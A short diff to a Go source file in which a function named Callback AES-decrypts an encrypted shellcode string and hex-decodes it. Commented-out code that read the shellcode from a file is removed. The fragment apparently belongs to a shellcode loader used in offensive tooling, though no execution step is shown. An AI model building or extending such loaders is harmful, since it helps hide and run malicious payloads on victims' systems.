@@ -17,11 +17,7 @@ var (
 )
 
 func Callback (shellcodeEncrypted string, key string){
-	//Read shellcode
-	// shellcodeEncrypted, err := ioutil.ReadFile(shellcodeFile)
-	// if err != nil {
- //          log.Fatal(err)
- //     }
+
     plaintext := crypto.DecryptAES(shellcodeEncrypted, key)
 	shellcode, _ := hex.DecodeString(string(plaintext))
 
